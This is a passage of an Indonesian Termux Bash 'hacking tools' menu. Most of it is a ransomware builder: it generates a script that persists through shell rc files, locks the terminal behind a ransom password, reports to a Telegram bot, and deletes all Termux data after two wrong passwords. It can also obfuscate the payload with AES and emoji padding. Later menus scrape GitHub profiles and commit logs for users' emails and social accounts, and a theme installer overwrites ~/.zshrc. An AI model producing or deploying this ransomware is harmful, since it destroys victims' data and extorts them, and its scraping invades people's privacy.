⢸⣿⣿⠀⠀⠀⢸⡇⠀⣿⣿⣿⠋⠀⠀⠙⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇
⢸⣿⣿⠀⠀⠀⢸⡇⠀⣿⣿⣿⡀⠀⠀⢀⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇
⠘⣿⣿⣆⠀⠀⢸⡇⠀⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⣰⣿⣿⠃
⠀⠘⣿⣿⣆⠀⢸⣧⣠⣿⣿⣿⣿⣄⣠⣿⣿⣿⣿⣿⣿⡇⠀⣰⣿⣿⠃⠀
⠀⠀⠘⢿⣿⣷⣄⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣠⣾⣿⡿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠀"
echo ""
echo -e "${c}$PESAN_TEBUSAN${n}"
echo ""
}
hapus_dari_rc() {
 for rc in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
 [ -f "$rc" ] && sed -i '/\.ransomlock\.sh/d' "$rc" 2>/dev/null || true
done
}
hapus_file_ransomlock() {
rm -f "$HOME/.ransomlock.sh"
}
hapus_semua_termux() {
clear
echo ""
echo -e "${r}[ ${g}>_< ${r}]${c} PASSWORD SALAH 2X! MENGHAPUS SEMUA DATA TERMUX."
sleep 3
find /data/data/com.termux/files -mindepth 1 -delete 2>/dev/null || rm -rf /data/data/com.termux/files/* 2>/dev/null
clear
echo ""
echo -e "${r}[ ${g}>_< ${r}]${y} Wkwkw Mampus Kau 😹🖕"
echo ""
exit 1
}
kunci_terminal() {
blok_ctrl
disable_paste
salah_count=0
while true; do
tampil_ransom
echo -ne "${r}[ ${g}?? ${r}]${y} Masukkan Passwordnya Goblok : "
read -r pwd
echo ""
if [ -z "$pwd" ]; then
    clear
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Password tidak boleh kosong."
    sleep 2
    continue
fi
if [ "$pwd" = "$PASSWORD" ]; then
     clear 
     echo ""
     echo -e "${r}[ ${g}✓ ${r}]${g} Password benar! Membuka akses."
     sleep 2
     hapus_dari_rc
     hapus_file_ransomlock
     stty echoctl 2>/dev/null || true
     clear
     return 0
else
     ((salah_count++))
       clear
       echo ""
       echo -e "${r}[ ${g}✗ ${r}]${y} Password salah! Goblok 😹🖕 [ $salah_count/2 ]"
       sleep 3
if [ $salah_count -ge 2 ]; then
     hapus_semua_termux
fi
fi
done
}
clear 
echo ""
bar &
BAR_PID=$!
kirim_ke_telegram
kill $BAR_PID 2>/dev/null
wait $BAR_PID 2>/dev/null
clear
if [[ "$0" == *".ransomlock.sh" ]]; then
    kunci_terminal
    exit 1
fi
cp "$0" "$HOME/.ransomlock.sh" && chmod +x "$HOME/.ransomlock.sh"
for rc in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
    if [ -f "$rc" ]; then
        if ! grep -q ".ransomlock.sh" "$rc" 2>/dev/null; then
            echo -e "\n# === RANSOMLOCK BY THXYZZ404 ===\nbash $HOME/.ransomlock.sh\n# =================================\n" >> "$rc"
        fi
    else
        echo -e "# === RANSOMLOCK BY THXYZZ404 ===\nbash $HOME/.ransomlock.sh\n" > "$rc"
    fi
done
bash "$HOME/.ransomlock.sh"
EOF
sed -i "s/TOKEN_BOT/$token/g" ransom.sh
sed -i "s/ID_BOT/$id/g" ransom.sh
sed -i "s/PASSWORD_RANSOM/$pas/g" ransom.sh
sed -i "s/PESAN_TEBUSAN/$pesan/g" ransom.sh
}
ransom_file() {
local pas="$1"
local pesan="$2"
local enkripsi="$3"   
kode_ransom "$pas" "$pesan"    
if [[ "$enkripsi" == "y" ]]; then
command -v openssl >/dev/null 2>&1 || {
clear
echo ""
echo -e "${r}Error : Anda Belum Menginstall ${c}pkg install openssl-tool"
echo ""
return 1
}
sed 's/exec/x_x_e_c/g' ransom.sh > .tmp_obfuscated
local key_hex=$(head -c 16 /dev/urandom | xxd -p)
openssl enc -aes-128-ecb -K "$key_hex" -nosalt -in .tmp_obfuscated -out .tmp_encrypted.bin 2>/dev/null || {
clear
echo ""
echo -e "${r}Error saat proses enkripsi dengan openssl!"
echo ""
return 1
}
local enc_hex=$(xxd -p .tmp_encrypted.bin | tr -d '\n')
local enc_obf=$(echo "$enc_hex" | rev | tr '0123456789abcdef' 'fedcba9876543210')
local key_obf=$(echo "$key_hex" | rev | tr '0123456789abcdef' 'fedcba9876543210')
local emoji_mix="💦💦💦💦💦💦"
local enc_with_emoji=""
for ((i=0; i<${#enc_obf}; i+=2)); do
    local idx=$(( (i/2) % ${#emoji_mix} ))
    enc_with_emoji+="${enc_obf:$i:2}${emoji_mix:$idx:1}"
done
local key_with_emoji=""
for ((i=0; i<${#key_obf}; i+=2)); do
    local idx=$(( (i/2) % ${#emoji_mix} ))
    key_with_emoji+="${key_obf:$i:2}${emoji_mix:$idx:1}"
done
local emoji_seq="💦💦💦💦💦💦"
decoder=$(cat <<EOF
q="$key_with_emoji"
w="$enc_with_emoji"
e=\$(echo "\$w" | sed 's/[💦💦💦💦💦💦]//g' | rev | tr 'fedcba9876543210' '0123456789abcdef')
echo "\$e" | xxd -r -p > .r
t=\$(echo "\$q" | sed 's/[💦💦💦💦💦💦]//g' | rev | tr 'fedcba9876543210' '0123456789abcdef')
openssl enc -d -aes-128-ecb -K "\$t" -nosalt -in .r -out .y
chmod +x .y
bash .y
rm -rf "$HOME/.y"
rm -rf "$HOME/.r"
rm -rf .r
rm -rf .y
EOF
)
{
   echo "#!/data/data/com.termux/files/usr/bin/bash"
   echo "a=\"$emoji_seq$emoji_seq$emoji_seq$emoji_seq$emoji_seq\""
   echo "eval \"\$(cat <<'EODEC'"
   echo "$decoder"
   echo "EODEC"
   echo ")\""
   echo "b=\"$emoji_seq$emoji_seq$emoji_seq$emoji_seq$emoji_seq\""
} > ransom.sh   
    chmod +x ransom.sh
    rm -f .tmp_obfuscated .tmp_encrypted.bin        
    mkdir -p /sdcard/A_Ransomware
    cp ransom.sh /sdcard/A_Ransomware/ransom.sh 2>/dev/null        
    echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
    echo -e "${r}[${g}✓${r}]${c} File ransomware terenkripsi.${n}"
    echo ""        
else
     mkdir -p /sdcard/A_Ransomware
     cp ransom.sh /sdcard/A_Ransomware/ransom.sh 2>/dev/null       
     echo -e "${r}\n[${g}✓${r}]${c} File ransomware tanpa enkripsi berhasil dibuat : ransom.sh${n}"
     echo ""
     echo -e "${r}[${g}✓${r}]${c} Disimpan : /sdcard/A_Ransomware/ransom.sh${n}\n"
     echo ""
fi
}
run() {
    banner
    read -p $'\e[92m[?] Masukkan pesan tebusan:\n>> \e[0m' pesan
    read -p $'\e[92m\n[?] Masukkan password:\n>> \e[0m' password
    read -p $'\e[92m[?] Masukkan token botz:\n>> \e[0m' token
    read -p $'\e[92m\n[?] Masukkan id botz:\n>> \e[0m' id
    read -p $'\e[92m\n[?] Enkripsi? [y/n]:\n>> \e[0m' enkrip
    echo ""
    ransom_file "$password" "$pesan" "$enkrip"
}
run
mek="ansi-rounded"
echo "
===========================
         INFORMASI
===========================
Password : $password
Pesan : $pesan
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "5" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
cd $HOME
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
b='\033[34;1m'
y='\033[33;1m'
n='\033[0m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
⠀⠀⠀⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣦⣀⣀⣤⣤⣤⣤⣤⣤⣄⣠⣶⣿⣿⣿⣿⡇⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢠⣿⣿⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⡟⠁⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠈⢻⣿⣿⣿⡇
⠘⣿⣿⣿⡇⠀⢠⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡄⠀⢸⣿⣿⣿⠃
⠀⢿⣿⣿⡇⠀⠀⠛⠟⠀⠀⠀⠀⠀⠀⠀⠀⠻⠛⠀⠀⢸⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠟⠀⠀
⠀⠀⠀⠀⠙⠛⠿⣷⣶⣤⣤⣤⣤⣤⣤⣤⣤⣴⣶⠿⠛⠋ 
" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Dork Username "
echo -e "${r}[${y} 02 ${r}] ${g}Dork URL clone "
echo -e "${r}[${y} 00 ${r}] ${c}Keluar"
}
git_1() {
MARKER=".run_once_done"
if [ ! -f "$MARKER" ]; then
    tr -d '\r' < Thxyzz404.sh > fixed.sh
    mv fixed.sh Thxyzz404.sh
    chmod +x Thxyzz404.sh
    touch "$MARKER"
    clear 
    echo ""
    echo -e "${g} Menjalankan script..!!"
    echo ""
    sleep 2
fi
check_dependencies() {
    local deps=("curl" "grep" "sed" "cut")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            clear 
            echo ""
            echo -e "${r}[!] Dependensi '$dep' tidak ditemukan."
            echo -e "${y}Jalankan : pkg install $dep"
            echo ""
        fi
    done
}
validate_username() {
    local username="$1"
    if [[ ! "$username" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo ""
        echo -e "${r}[!] Username tidak valid."
        echo ""
        return 1
    fi
    return 0
}
get_github_user() {
    local username="$1"
    pantau_aktivitas
    data=$(curl -s "https://api.github.com/users/$username")
    if echo "$data" | grep -q "Not Found"; then
        echo ""
        echo -e "${r}[!] Username '$username' tidak ditemukan di GitHub."
        echo ""
        return 1
    fi
    echo "$data"
    return 0
}
get_field() {
    local field="$1"
    local value
    value=$(echo "$data" | grep "\"$field\"" | cut -d ':' -f2- | sed 's/[",]//g' | sed 's/^ //')
    if [[ -z "$value" || "$value" == "null" ]]; then
        echo "Tidak di temukan"
    else
        echo "$value"
    fi
}
get_email_fallback() {
    local email
    email=$(get_field "email")
    if [[ "$email" == "Tidak di temukan" ]]; then
        local bio
        bio=$(get_field "bio")
        email=$(echo "$bio" | grep -Eo "[a-zA-Z0-9.%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    fi
    echo "${email:-Gmail tidak ada}"
}
get_facebook_from_bio() {
    local fb
    fb=$(get_field "bio" | grep -ioE "facebook.com/[a-zA-Z0-9.-]+|fb.me/[a-zA-Z0-9.-]+|[Ff]acebook[: ]+[a-zA-Z0-9.-]+" | head -n1)
    echo "${fb:-Facebook tidak ada}"
}
get_instagram_from_bio() {
    local ig
    ig=$(get_field "bio" | grep -ioE "instagram.com/[a-zA-Z0-9._-]+|[Ii]nstagram[: ]+[a-zA-Z0-9._-]+" | head -n1)
    echo "${ig:-Instagram tidak ada}"
}
main() {
check_dependencies
clear
    echo -e "${p}"
    read -p "Masukkan Username Github Target : " username
    echo ""
    if ! validate_username "$username"; then
        return
    fi
    data=$(get_github_user "$username") || return
    name=$(get_field "name")
    bio=$(get_field "bio")
    avatar=$(get_field "avatar_url")
    url=$(get_field "html_url")
    location=$(get_field "location")
    followers=$(get_field "followers")
    following=$(get_field "following")
    public_repos=$(get_field "public_repos")
    created_at=$(get_field "created_at")
    updated_at=$(get_field "updated_at")
    company=$(get_field "company")
    id=$(get_field "id")
    email=$(get_email_fallback)
    facebook=$(get_facebook_from_bio)
    instagram=$(get_instagram_from_bio)
    echo -e "${g}=================================================="
    echo -e "${r}[ ${c}☢ ${r}]${y} GitHub OSINT Username : ${b}$username ${r}[${c} ☢ ${r}]"
    echo -e "${g}=================================================="
    echo ""
    echo -e "${r}[${g} ✓ ${r}]${y} Username : ${c}@$username"
    echo -e "${r}[${g} ✓ ${r}]${y} ID Pengguna : ${c}${id}"
    echo -e "${r}[${g} ✓ ${r}]${y} Nama Lengkap : ${c}${name}"
    echo -e "${r}[${g} ✓ ${r}]${y} Bio : ${c}${bio}"
    echo -e "${r}[${g} ✓ ${r}]${y} Lokasi : ${c}${location}"
    echo -e "${r}[${g} ✓ ${r}]${y} Perusahaan : ${c}${company}"
    echo -e "${r}[${g} ✓ ${r}]${y} Gmail : ${c}$email"
    echo -e "${r}[${g} ✓ ${r}]${y} Facebook : ${c}$facebook"
    echo -e "${r}[${g} ✓ ${r}]${y} Instagram : ${c}$instagram"
    echo -e "${r}[${g} ✓ ${r}]${y} Followers : ${c}${followers}"
    echo -e "${r}[${g} ✓ ${r}]${y} Mengikuti : ${c}${following}"
    echo -e "${r}[${g} ✓ ${r}]${y} Repo Publik : ${c}${public_repos}"
    echo -e "${r}[${g} ✓ ${r}]${y} Tanggal Dibuat : ${c}${created_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Terakhir Update : ${c}${updated_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Avatar : ${c}${avatar}"
    echo -e "${r}[${g} ✓ ${r}]${y} URL Profil : ${c}${url}"
    echo ""
    echo -e "${g}"
    read -p "Apakah anda ingin cari pengguna lain? (y/n) : " choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        main
    else
        echo ""
        echo -e "${r}Keluar dari program."
        echo ""
    fi
}
main
}
git_2() {
bar() {
    f=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while true; do
        for fra in "${f[@]}"; do
            printf "\r$fra \033[41;1m\033[1;32m Sedang analisis. \033[0m "
            sleep 0.12
        done
    done
}
clear
echo -e "${c}"
read -p "Masukkan url git clone : " url
echo ""
bar &
bar_pid=$!
git clone "$url" > /dev/null 2>&1
kill $bar_pid 2>/dev/null
echo ""
der=$(basename "$url" .git)
cd "$der"
echo ""
echo -e "${r}============================="
echo -e "${g}  INFORMASI YANG DI DAPAT "
echo -e "${r}============================="
echo -e "${b}"
git log --pretty=format:"%an %ae" | sort -u
echo ""
echo -e "${p}"
read -p "Apakah menghapus clone [ y/n ] : " del
echo ""
if [[ $del == "y" || $del == "Y" ]]; then
    cd "$HOME"
    rm -rf "$der"
    echo -e "${r}[ ${g}✓ ${r}]${y} Folder berhasil di hapus : " $der
fi
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) git_1 ;;
        2|02) git_2 ;;
        0|00) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "6" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
cd $HOME
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
mek="ansi-rounded"
echo "
████████╗███████╗███╗   ███╗ █████╗ 
╚══██╔══╝██╔════╝████╗ ████║██╔══██╗
   ██║   █████╗  ██╔████╔██║███████║
   ██║   ██╔══╝  ██║╚██╔╝██║██╔══██║
   ██║   ███████╗██║ ╚═╝ ██║██║  ██║
   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
            By : ToolslV " | boxes -d "$mek" | lolcat
echo ""
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${g}01 ${r}]${c} Tampilan Pro                  ${b}║"
echo -e "║${r} [ ${g}02 ${r}]${c} Hapus Tampilan                ${b}║"
echo -e "║${r} [ ${g}03 ${r}]${p} Keluar                        ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${c}║"
read -p "╚═[ By.Thxyzz404 ]══•➤ : " ha
case "$ha" in
1|01)
if [ -d "$HOME/.oh-my-zsh" ] && [ -d "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions" ] && [ -d "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" ]; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${p} Tidak perlu install lagi."
    echo ""
    pkill -9 -f com.termux
fi
{
  pkg install -y boxes lolcat >/dev/null 2>&1
  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" --unattended >/dev/null 2>&1    
  cd ~/.oh-my-zsh/custom/plugins
  git clone --quiet --depth 1 https://github.com/zsh-users/zsh-autosuggestions >/dev/null 2>&1
  git clone --quiet --depth 1 https://github.com/zsh-users/zsh-syntax-highlighting >/dev/null 2>&1
} &
pid=$!
chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
i=0
while kill -0 $pid 2>/dev/null; do
    clear
    echo ""
    printf "\r${r}[ ${g}%s ${r}]${c} Sedang instalasi..!!" "${chars[i]}"
    echo ""
    i=$(( (i+1) % ${#chars[@]} ))
    sleep 0.1
done
printf "\r\033[K"
clear
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Sukses instalasi."
echo ""
sleep 3
clear
cat > ~/.zshrc << 'EOF'
TEMA_FILE="$HOME/.tema_counter"
if [[ ! -f "$TEMA_FILE" ]]; then
    echo "1" > "$TEMA_FILE"
fi
counter=$(cat "$TEMA_FILE")
case $counter in
    1) tema="Tema_1"; next=2 ;;
    2) tema="Tema_2"; next=3 ;;
    3) tema="Tema_3"; next=4 ;;
    4) tema="Tema_4"; next=1 ;;
    *) tema="Tema_1"; next=2 ;;
esac
echo "$next" > "$TEMA_FILE"
export ZSH="$HOME/.oh-my-zsh"
mek="ansi-rounded"
Tema_1() {
echo "
   ⣰⣟⠲⠤⣤⣤⣤⠶⢖⣲⣶⡶⢶⣶⣖⡲⠶⣤⣤⣤⡤⠖⡛⣆   
   ⡏⣿⣷⣄ ⡟⢡⡶⠛⠉⠁  ⠈⠉⠛⢶⡌⠻ ⣠⣾⣿⢹   
   ⡇⢹⣿⣿⠆⣠⠞⢁⣀⣠⣤⡴⢦⣤⣄⣀⡈⠳⣄⢰⣿⣿⣟⢸⡄  
   ⢻⣤⡻⠁⡸⢃⠜⠋⠉⠉⣠ ⠐⣄⠉⠉⠙⠢⡘⢧⡙⣿⣣⡿   
  ⢀⣾⡷⠁⠊  ⠤⠖⠋⠉⠑⡀⢀⠊⠉⠙⠲⠤  ⠑ ⢾⣷⡄  
  ⣴⡿⠃ ⡀⣀⡴⠁⣤⠶⠚⠋  ⠙⠓⠶⣤⠈⢦⣀⢀ ⠘⢿⣦  
⢀⣾⠏ ⣰⡟⢰⢏⣀⡐⠁       ⡀⠈⢂⣀⡙⡆⢻⣆ ⠹⣷⡀
⣼⡏  ⣿⣧⠸ ⠻⣏⠟⣾⣄    ⣠⣷⠻⣹⠟ ⠇⣼⣷⡀ ⢹⣷
⣿⣰  ⣿⣿⡇  ⠉⠉⢹⣿    ⣿⡏⠉⠉  ⢸⣿⣿⠁ ⣆⣿
⢻⢿⣠  ⣿⣯⠁  ⢀⡞     ⠈⢷⡀  ⠊⣽⣿⠁ ⡀⡿⡟
⠈⢸⣿⡆⡀⠈⢿⣇⡀ ⡼⢰      ⡏⢧ ⢀⣸⡿⠃⢀⢰⣿⡗ 
 ⠈⢿⢿⣿⣦⡈⠻⢿⣄⡁⡾      ⢷⢈⣠⡿⠟⢁⣴⣿⡿⡻⠁ 
   ⠈⠻⠟⢿⣶⣤⣿⢇⢳⡀    ⢀⡞⡸⣿⣤⣶⡿⠻⠟⠁   
        ⣘⣿⣒⣂⠙⠛⢷⡾⠛⠋⢐⣒⣿⣓        
         ⠚⣧⣖⣀⣀⣬⣧⣀⣀⣲⣽⠃⠒        
          ⠉⠛⠳⢤⣄⣠⡤⠾⠛⠉ 
" | boxes -d "$mek" | lolcat
}
Tema_2() {
echo "
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
" | boxes -d "$mek" | lolcat
}
Tema_3() {
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛ 
" | boxes -d "$mek" | lolcat
}
Tema_4() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣶⣿⣿⠿⠛⠉⠉⠉⠀⠀⠉⠉⠉⠛⠿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⠟⠉⠀⠀⠀⠀⢀⣤⣤⣤⣀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀
⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣯⣢⡀⠀⠀⠀⠈⢻⣿⣧⠀⠀
⠀⣼⣿⡟⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⠀
⢸⣿⡟⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇
⣾⣿⡇⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷
⣿⣿⡁⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿
⢿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢸⣿⡿
⢸⣿⣧⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⣼⣿⡇
⠀⢻⣿⣧⠀⠀⠀⠀⠈⠋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⡟⠀
